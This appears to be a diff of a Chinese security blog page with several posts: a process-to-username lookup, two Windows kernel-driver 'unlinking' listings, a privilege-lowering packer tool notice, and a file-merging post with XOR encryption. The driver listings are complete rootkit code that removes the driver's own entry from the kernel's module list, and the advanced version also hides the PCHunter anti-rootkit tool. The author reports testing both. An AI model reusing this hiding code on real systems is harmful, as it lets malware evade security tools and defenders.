MAX_PATH;</span><br><span class="line">				WCHAR szDomainName[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">				DWORD dwDomainNameSize = MAX_PATH;</span><br><span class="line">				SID_NAME_USE  snu;</span><br><span class="line">				<span class="keyword">if</span> (LookupAccountSid(<span class="literal">NULL</span>, pToken-&gt;User.Sid, szUserName, &amp;dwUserNameSize, szDomainName, &amp;dwDomainNameSize, &amp;snu))</span><br><span class="line">				&#123;</span><br><span class="line">					wprintf(<span class="string">L&quot;UserName : %s\\%s\r\n&quot;</span>, szDomainName, szUserName);</span><br><span class="line">					<span class="keyword">return</span> TRUE;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					wprintf(<span class="string">L&quot;LookupAccountSid failed : %d\r\n&quot;</span>, GetLastError());</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			wprintf(<span class="string">L&quot;GetTokenInformation failed : %d\r\n&quot;</span>, GetLastError());</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	GetUserNameFromPID(<span class="number">2304</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>经过测试，需要相应的打开进程句柄权限才可以执行</p>
+<p><img src="/2021/07/07/findUsernameWithPid/image.png" alt="image.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/07/breaklink-more/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Airshelf">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Airshelf's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/07/07/breaklink-more/" class="post-title-link" itemprop="url">代码模块 | 驱动摘链(进阶)</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-07-07 09:41:00 / Modified: 09:45:31" itemprop="dateCreated datePublished" datetime="2021-07-07T09:41:00+08:00">2021-07-07</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>相比与上一篇文章，这篇增加了对于任意驱动的断链的功能</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> POBJECT_TYPE *IoDriverObjectType;</span><br><span class="line"></span><br><span class="line"><span class="function">NTKERNELAPI NTSTATUS <span class="title">ObReferenceObjectByName</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    __in PUNICODE_STRING ObjectName,</span></span></span><br><span class="line"><span class="params"><span class="function">    __in ULONG Attributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    __in_opt PACCESS_STATE AccessState,</span></span></span><br><span class="line"><span class="params"><span class="function">    __in_opt ACCESS_MASK DesiredAccess,</span></span></span><br><span class="line"><span class="params"><span class="function">    __in POBJECT_TYPE ObjectType,</span></span></span><br><span class="line"><span class="params"><span class="function">    __in KPROCESSOR_MODE AccessMode,</span></span></span><br><span class="line"><span class="params"><span class="function">    __inout_opt PVOID ParseContext,</span></span></span><br><span class="line"><span class="params"><span class="function">    __out PVOID* Object</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NON_PAGED_DEBUG_INFO</span> &#123;</span></span><br><span class="line">    USHORT      Signature;</span><br><span class="line">    USHORT      Flags;</span><br><span class="line">    ULONG       Size;</span><br><span class="line">    USHORT      Machine;</span><br><span class="line">    USHORT      Characteristics;</span><br><span class="line">    ULONG       TimeDateStamp;</span><br><span class="line">    ULONG       CheckSum;</span><br><span class="line">    ULONG       SizeOfImage;</span><br><span class="line">    ULONGLONG   ImageBase;</span><br><span class="line">&#125; NON_PAGED_DEBUG_INFO, * PNON_PAGED_DEBUG_INFO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KLDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">    PVOID ExceptionTable;</span><br><span class="line">    ULONG ExceptionTableSize;</span><br><span class="line">    <span class="comment">// ULONG padding on IA64</span></span><br><span class="line">    PVOID GpValue;</span><br><span class="line">    PNON_PAGED_DEBUG_INFO NonPagedDebugInfo;</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;</span><br><span class="line">    UNICODE_STRING BaseDllName;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    USHORT LoadCount;</span><br><span class="line">    USHORT __Unused5;</span><br><span class="line">    PVOID SectionPointer;</span><br><span class="line">    ULONG CheckSum;</span><br><span class="line">    <span class="comment">// ULONG padding on IA64</span></span><br><span class="line">    PVOID LoadedImports;</span><br><span class="line">    PVOID PatchInformation;</span><br><span class="line">&#125; KLDR_DATA_TABLE_ENTRY, * PKLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	KdPrint((<span class="string">&quot;Driver Unloaded !!!\r\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">BreakMyLink</span><span class="params">(PVOID pContent)</span>  <span class="comment">//将自身摘链</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LARGE_INTEGER large = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    large.QuadPart = <span class="number">-10000</span> * <span class="number">1000</span>;   <span class="comment">//1ske</span></span><br><span class="line">    KeDelayExecutionThread(KernelMode, TRUE, &amp;large);</span><br><span class="line">    PDRIVER_OBJECT pDriver = (PDRIVER_OBJECT)pContent;</span><br><span class="line">    PKLDR_DATA_TABLE_ENTRY myLink = &amp;((PKLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection)-&gt;InLoadOrderLinks;</span><br><span class="line">    pDriver-&gt;DriverSection = ((PKLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection)-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">    RemoveEntryList(myLink);</span><br><span class="line">    pDriver-&gt;Type = <span class="number">0</span>;</span><br><span class="line">    pDriver-&gt;DriverInit = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">ListAllDriver</span><span class="params">(PDRIVER_OBJECT pDriver)</span>  <span class="comment">//使用链表遍历驱动</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PKLDR_DATA_TABLE_ENTRY nextHeader = &amp;((PKLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection)-&gt;InLoadOrderLinks;</span><br><span class="line">    PKLDR_DATA_TABLE_ENTRY nextList = (PKLDR_DATA_TABLE_ENTRY)nextHeader-&gt;InLoadOrderLinks.Flink;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (nextHeader != nextList)</span><br><span class="line">    &#123;</span><br><span class="line">        KdPrint((<span class="string">&quot;%wZ\r\n&quot;</span>,&amp;nextList-&gt;FullDllName));</span><br><span class="line">        nextList = (PKLDR_DATA_TABLE_ENTRY)nextList-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BreakLinkByName</span><span class="params">(PWCHAR objName)</span>  <span class="comment">//通过驱动名断链驱动</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    UNICODE_STRING DriverName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    RtlInitUnicodeString(&amp;DriverName, objName);</span><br><span class="line">    PDRIVER_OBJECT pDriver = <span class="literal">NULL</span>;</span><br><span class="line">    LARGE_INTEGER large = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    large.QuadPart = <span class="number">-10000</span> * <span class="number">5000</span>;   <span class="comment">//5s</span></span><br><span class="line">    KeDelayExecutionThread(KernelMode, TRUE, &amp;large);</span><br><span class="line">    NTSTATUS status =  ObReferenceObjectByName(&amp;DriverName,FILE_ALL_ACCESS,<span class="literal">NULL</span>,<span class="literal">NULL</span>,*IoDriverObjectType,KernelMode,<span class="literal">NULL</span>,&amp;pDriver);</span><br><span class="line">    <span class="keyword">if</span> (NT_SUCCESS(status)) </span><br><span class="line">    &#123;</span><br><span class="line">        PKLDR_DATA_TABLE_ENTRY myLink = &amp;((PKLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection)-&gt;InLoadOrderLinks;</span><br><span class="line">        pDriver-&gt;DriverSection = ((PKLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection)-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">        RemoveEntryList(myLink);</span><br><span class="line">        pDriver-&gt;Type = <span class="number">0</span>;</span><br><span class="line">        pDriver-&gt;DriverInit = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        ObDereferenceObject(pDriver);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">if</span> (NT_SUCCESS(ListAllDriver(pDriver))) </span><br><span class="line">    &#123;</span><br><span class="line">        KdPrint((<span class="string">&quot;List All Drivers Success\r\n&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//BreakLinkByName(L&quot;\\driver\\PCHunter32as&quot;);</span></span><br><span class="line"></span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">    PsCreateSystemThread(&amp;hThread,THREAD_ALL_ACCESS,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,BreakMyLink,pDriver);</span><br><span class="line">    PsCreateSystemThread(&amp;hThread, THREAD_ALL_ACCESS, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, BreakLinkByName, <span class="string">L&quot;\\driver\\PCHunter32as&quot;</span>);</span><br><span class="line"></span><br><span class="line">	pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	KdPrint((<span class="string">&quot;Driver Loaded !!!\r\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>驱动加载前，先打开PCHUNTER，可以看到PCHUNTER自身驱动：<br><img src="/2021/07/07/breaklink-more/before_breaklink.png" alt="image.png"></p>
+<p>驱动断链后，首先隐藏了自身的驱动加载，其次隐藏了PCHUNTER的驱动：<br><img src="/2021/07/07/breaklink-more/after_breaklink.png" alt="image.png"><br>```</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/05/breaklinks/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Airshelf">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Airshelf's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/07/05/breaklinks/" class="post-title-link" itemprop="url">代码模块 | 驱动摘链</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-07-05 10:07:07 / Modified: 10:17:55" itemprop="dateCreated datePublished" datetime="2021-07-05T10:07:07+08:00">2021-07-05</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NON_PAGED_DEBUG_INFO</span> &#123;</span></span><br><span class="line">    USHORT      Signature;</span><br><span class="line">    USHORT      Flags;</span><br><span class="line">    ULONG       Size;</span><br><span class="line">    USHORT      Machine;</span><br><span class="line">    USHORT      Characteristics;</span><br><span class="line">    ULONG       TimeDateStamp;</span><br><span class="line">    ULONG       CheckSum;</span><br><span class="line">    ULONG       SizeOfImage;</span><br><span class="line">    ULONGLONG   ImageBase;</span><br><span class="line">&#125; NON_PAGED_DEBUG_INFO, * PNON_PAGED_DEBUG_INFO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KLDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">    PVOID ExceptionTable;</span><br><span class="line">    ULONG ExceptionTableSize;</span><br><span class="line">    <span class="comment">// ULONG padding on IA64</span></span><br><span class="line">    PVOID GpValue;</span><br><span class="line">    PNON_PAGED_DEBUG_INFO NonPagedDebugInfo;</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;</span><br><span class="line">    UNICODE_STRING BaseDllName;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">    USHORT LoadCount;</span><br><span class="line">    USHORT __Unused5;</span><br><span class="line">    PVOID SectionPointer;</span><br><span class="line">    ULONG CheckSum;</span><br><span class="line">    <span class="comment">// ULONG padding on IA64</span></span><br><span class="line">    PVOID LoadedImports;</span><br><span class="line">    PVOID PatchInformation;</span><br><span class="line">&#125; KLDR_DATA_TABLE_ENTRY, * PKLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriver)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	KdPrint((<span class="string">&quot;Driver Unloaded !!!\r\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">BreakMyLink</span><span class="params">(PVOID pContent)</span>  <span class="comment">//将自身摘链</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    LARGE_INTEGER large = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    large.QuadPart = <span class="number">-10000</span> * <span class="number">1000</span>;</span><br><span class="line">    KeDelayExecutionThread(KernelMode, TRUE, &amp;large);</span><br><span class="line">    PDRIVER_OBJECT pDriver = (PDRIVER_OBJECT)pContent;</span><br><span class="line">    PKLDR_DATA_TABLE_ENTRY myLink = &amp;((PKLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection)-&gt;InLoadOrderLinks;</span><br><span class="line">    RemoveEntryList(myLink);</span><br><span class="line">    pDriver-&gt;Type = <span class="number">0</span>;</span><br><span class="line">    pDriver-&gt;Size = <span class="number">0</span>;</span><br><span class="line">    pDriver-&gt;DriverSection = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">ListAllDriver</span><span class="params">(PDRIVER_OBJECT pDriver)</span>  <span class="comment">//使用链表遍历驱动</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PKLDR_DATA_TABLE_ENTRY nextHeader = &amp;((PKLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection)-&gt;InLoadOrderLinks;</span><br><span class="line">    PKLDR_DATA_TABLE_ENTRY nextList = (PKLDR_DATA_TABLE_ENTRY)nextHeader-&gt;InLoadOrderLinks.Flink;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (nextHeader != nextList)</span><br><span class="line">    &#123;</span><br><span class="line">        KdPrint((<span class="string">&quot;%wZ\r\n&quot;</span>,&amp;nextList-&gt;FullDllName));</span><br><span class="line">        nextList = (PKLDR_DATA_TABLE_ENTRY)nextList-&gt;InLoadOrderLinks.Flink;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">if</span> (NT_SUCCESS(ListAllDriver(pDriver))) </span><br><span class="line">    &#123;</span><br><span class="line">        KdPrint((<span class="string">&quot;List All Drivers Success\r\n&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">    PsCreateSystemThread(&amp;hThread,THREAD_ALL_ACCESS,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,BreakMyLink,pDriver);</span><br><span class="line"></span><br><span class="line">	pDriver-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	KdPrint((<span class="string">&quot;Driver Loaded !!!\r\n&quot;</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>经32位下测试，完成通过链表遍历驱动，然后将自身从链表中摘除以达到驱动隐藏的目的</p>
+<p>效果如下：</p>
+<p><img src="/2021/07/05/breaklinks/image.png" alt="image.png"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/02/projectSelectMyParent/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Airshelf">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Airshelf's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/07/02/projectSelectMyParent/" class="post-title-link" itemprop="url">项目开源 | 降权工具</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-07-02 15:57:24" itemprop="dateCreated datePublished" datetime="2021-07-02T15:57:24+08:00">2021-07-02</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-07-05 10:18:03" itemprop="dateModified" datetime="2021-07-05T10:18:03+08:00">2021-07-05</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>SelectMyParent是一款降权工具</p>
+<p>降权通常是指从system权限降到普通用户权限（从管理员权限降到普通用户权限比较简单，方法很多），往往是为了操作当前用户的文件内容（如捕获桌面、操作注册表等）</p>
+<p>本工具的功能，是将从system权限到admin权限</p>
+<p>相比于原版SelectMyParent，本工具新增了下面几个功能</p>
+<p>[+] 自动判断属于Admin的进程<br>[+] 自动判断当前用户，如果不是system，则会以本进程的身份运行<br>[+] 通过合并的方式拼接待运行程序，运行时释放</p>
+<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>vs2019编译测试，编译完成</p>
+<p>输入命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PluginPacker.exe abc.exe（这个是你要用的程序）</span><br></pre></td></tr></table></figure>
+
+<p>然后会在同级目录下产生abc_protected.exe</p>
+<p>然后abc_protected.exe已经可以单独运行，且携带SelectMyParent的功能</p>
+<h3 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h3><p><a target="_blank" rel="noopener" href="https://github.com/airshelf/MySelectMyParent">https://github.com/airshelf/MySelectMyParent</a></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/02/MySelectMyParent/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Airshelf">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Airshelf's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021/07/02/MySelectMyParent/" class="post-title-link" itemprop="url">代码模块 | 合并两个文件</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-07-02 15:51:38" itemprop="dateCreated datePublished" datetime="2021-07-02T15:51:38+08:00">2021-07-02</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-07-05 10:18:07" itemprop="dateModified" datetime="2021-07-05T10:18:07+08:00">2021-07-05</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>下述代码实现了</p>
+<p>[+] 将两个文件合并为一个文件<br>[+] 合并第二个文件前，将其异或加密<br>[+] 第一个文件的长度添加到最后</p>
